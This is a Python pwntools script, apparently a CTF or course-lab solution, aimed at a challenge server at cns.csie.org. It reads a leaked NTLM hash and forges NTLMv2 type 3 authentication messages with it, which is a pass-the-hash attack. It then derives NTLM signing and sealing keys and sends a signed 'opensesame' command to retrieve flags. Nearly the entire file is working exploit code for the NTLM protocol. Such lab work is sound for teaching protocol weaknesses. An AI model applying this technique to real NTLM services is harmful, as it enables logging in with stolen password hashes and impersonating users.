from pwn import *
from Crypto.Cipher import ARC4
import hmac
import hashlib
import base64
import binascii
import math

target_name = b'CNS'
# target info : Server name : CNS, DNS domain name : csie.org, DNS server name : cns.csie.org
target_info = b'\x01\x00\x03\x00CNS\x04\x00\x08\x00csie.org\x03\x00\x0c\x00cns.csie.org\x00\x00\x00\x00'

def header_signature():
    return b'NTLMSSP\x00'

def header_type(message_type):
    return message_type.to_bytes(4, "little")

def header_flags(flags):
    return flags.to_bytes(4, "little")

def write_security_buffer(input_bytes, offset):
    length = len(input_bytes).to_bytes(2, "little")
    allocated_size = length
    offset = offset.to_bytes(4, "little")
    return length + allocated_size + offset

def read_seurity_buffer(input_bytes):
    if isinstance(input_bytes, str):
        input_bytes = input_bytes.encode()

    length = int.from_bytes(input_bytes[:2], "little")
    allocated_size = int.from_bytes(input_bytes[2:4], "little")
    offset = int.from_bytes(input_bytes[4:8], "little")
    return length, allocated_size, offset

def gen_type1_msg():
    msg = header_signature() + header_type(1)
    msg += bytes.fromhex('17820860')
    return msg

def parse_type2_msg(msg):
    signature, type_i, flag, challenge, content, target_info = msg[:8], msg[8:12], msg[20:24], msg[24:32], msg[32:48], msg[48:56]
    target_name_length, target_name_size, target_name_offset = read_seurity_buffer(msg[12:20])
    target_info_length, target_info_size, target_info_offset = read_seurity_buffer(msg[40:48])
    target_name = msg[target_name_offset:target_name_offset + target_name_length]
    target_info = msg[target_info_offset:target_info_offset + target_info_length]
    print(f'signature : {signature.hex()}')
    print(f'type : {type_i.hex()}')
    print(f'flag : {flag.hex()}')
    print(f'challenge : {challenge.hex()}')
    print(f'target name : {target_name}, hex : {target_name.hex()}')
    print(f'target info : {target_info}, hex : {target_info.hex()}')
    return (flag, challenge, target_name, target_info)

def gen_type3_msg(flag:bytes, challenge:bytes, target_name:bytes, target_info:bytes, md4_hash, username:bytes, session_key):
    LMv2_response = gen_LMv2_response(challenge, target_name, md4_hash, username)
    NTLMv2_response = gen_NTLMv2_response(challenge, target_name, target_info, md4_hash, username)
    # sec buffs' offset
    off_1 = 64
    off_2 = off_1 + len(target_name)
    off_3 = off_2 + len(username)
    off_4 = off_3 + len(b'MEMBER')
    off_5 = off_4 + len(LMv2_response)
    off_6 = off_5 + len(NTLMv2_response)
    # LMv2 + NTLMv2 sec-buff
    msg = header_signature() + header_type(3) + write_security_buffer(LMv2_response, off_4) + write_security_buffer(NTLMv2_response, off_5)
    # target name + username sec-buff
    msg += (write_security_buffer(target_name, off_1) + write_security_buffer(username, off_2))
    # workstation + session key sec-buff
    msg += (write_security_buffer(b'MEMBER', off_3)) + write_security_buffer(session_key, off_6)
    msg += flag
    #       target_name + username + worksta   + LMv2_response + NTLMv2_response + session key
    msg += (target_name + username + b'MEMBER' + LMv2_response + NTLMv2_response + session_key)
    return msg

def gen_LMv2_response(challenge, target_name, md4_hash, username):
    nonce = bytes.fromhex('ffffff0011223344')
    NTLM_hash = bytes.fromhex(md4_hash.decode())

    # NTLMv2 hash
    key = NTLM_hash
    msg = username.upper() + target_name
    NTLMv2_hash = hmac.new(key, msg, hashlib.md5).hexdigest()

    key = bytes.fromhex(NTLMv2_hash)
    msg = challenge + nonce
    hmac_md5 = hmac.new(key, msg, hashlib.md5).hexdigest()
    LMv2_response = bytes.fromhex(hmac_md5) + nonce
    return LMv2_response

def gen_NTLMv2_response(challenge, target_name, target_info, md4_hash, username):
    nonce = bytes.fromhex('ffffff0011223344')
    NTLM_hash = bytes.fromhex(md4_hash.decode())

    # NTLMv2 hash
    key = NTLM_hash
    msg = username.upper() + target_name
    NTLMv2_hash = hmac.new(key, msg, hashlib.md5).hexdigest()

    # blob                 signature  + reserv val + timestamp          + nonce       + unknown    + target_info       + unknown
    blob = bytes.fromhex(('01010000') + '00000000' + '0090d336b734c301' + nonce.hex() + '00000000' + target_info.hex() + '00000000')
    key = bytes.fromhex(NTLMv2_hash)
    msg = challenge + blob
    hmac_md5 = hmac.new(key, msg, hashlib.md5).hexdigest()
    NTLMv2_response = bytes.fromhex(hmac_md5) + blob    
    return NTLMv2_response

def gen_master_key(challenge, target_name, target_info, md4_hash, username):
    nonce = bytes.fromhex('ffffff0011223344')
    NTLM_hash = bytes.fromhex(md4_hash.decode())

    # NTLMv2 hash
    key = NTLM_hash
    msg = username.upper() + target_name
    NTLMv2_hash = hmac.new(key, msg, hashlib.md5).hexdigest()

    # blob
    blob = bytes.fromhex(('01010000') + '00000000' + '0090d336b734c301' + nonce.hex() + '00000000' + target_info.hex() + '00000000')
    key = bytes.fromhex(NTLMv2_hash)
    msg = challenge + blob
    master_key = hmac.new(key, msg, hashlib.md5).hexdigest()
    return bytes.fromhex(master_key)

def gen_NTLMv2_user_session_key(master_key):
    session_key = key_exchange(master_key)
    return session_key

# For example, assume that the client selects the random master key "0xf0f0aabb00112233445566778899aabb". The client will encrypt this value using RC4 with the previously negotiated master key ("0x3f373ea8e4af954f14faa506f8eebdc4") to obtain the value:
def key_exchange(key):
    select_key = bytes.fromhex('f0f0aabb00112233445566778899aabb')
    cipher = ARC4.new(key)
    ciphertext = cipher.encrypt(select_key)
    return ciphertext

def gen_client_signing_key(master_key):
    const_str = '73657373696f6e206b657920746f20636c69656e742d746f2d736572766572207369676e696e67206b6579206d6167696320636f6e7374616e7400'
    msg = master_key + bytes.fromhex(const_str)
    hash_object = hashlib.md5()
    hash_object.update(msg)
    signing_key = hash_object.hexdigest()
    return bytes.fromhex(signing_key)

def gen_client_sealing_key(master_key):
    const_str = '73657373696f6e206b657920746f20636c69656e742d746f2d736572766572207365616c696e67206b6579206d6167696320636f6e7374616e7400'
    weaken_master_key = master_key  # since Negotiate 128 is set
    msg = weaken_master_key + bytes.fromhex(const_str)
    hash_object = hashlib.md5()
    hash_object.update(msg)
    sealing_key = hash_object.hexdigest()
    return bytes.fromhex(sealing_key)

def sign_msg(msg, seq_num, signing_key, sealing_key):
    message = bytes.fromhex(seq_num) + msg.encode()
    hmac_md5 = hmac.new(signing_key, message, hashlib.md5).hexdigest()
    cipher = ARC4.new(sealing_key)
    ciphertext = cipher.encrypt(bytes.fromhex(hmac_md5)[:8])
    signed_msg = bytes.fromhex('01000000') + ciphertext + bytes.fromhex(seq_num)
    return signed_msg

# connect
r = remote('cns.csie.org', 44397)
r.recvuntil('"Azar": "'.encode())
# leaked data
md4_hash = r.recvuntil('"'.encode(), drop = True)

r.sendlineafter('>>> '.encode(), '1'.encode())
r.sendlineafter('Username: '.encode(), 'Azar'.encode())

# generate type 1
msg = gen_type1_msg()

r.sendline(msg)
msg = r.recvuntil('\n'.encode(), drop = True)

# parse type 2
ret = parse_type2_msg(msg)  # ret = (flag, challenge, target_name, target_info)

# generate master key
username = b'test'
init_master_key = gen_master_key(ret[1], ret[2], ret[3], md4_hash, username)
session_key = gen_NTLMv2_user_session_key(init_master_key)
# generate type 3
msg = gen_type3_msg(ret[0], ret[1], ret[2], ret[3], md4_hash, username, session_key)
# print(f'type 3 : {msg}')

r.sendline(msg)
r.recvline()
flag1 = r.recvline().decode()
print(f'flag 1 : {flag1}')

# rescue Nahida!
# create signing & sealing key from master key
client_signing_key = gen_client_signing_key(session_key)
client_sealing_key = gen_client_sealing_key(session_key)
command = 'opensesame'
seq_num = '00000000'
signed_command = sign_msg(command, seq_num, client_signing_key, client_sealing_key)
r.sendlineafter('>>> '.encode(), command.encode())
r.sendline(signed_command)
r.interactive()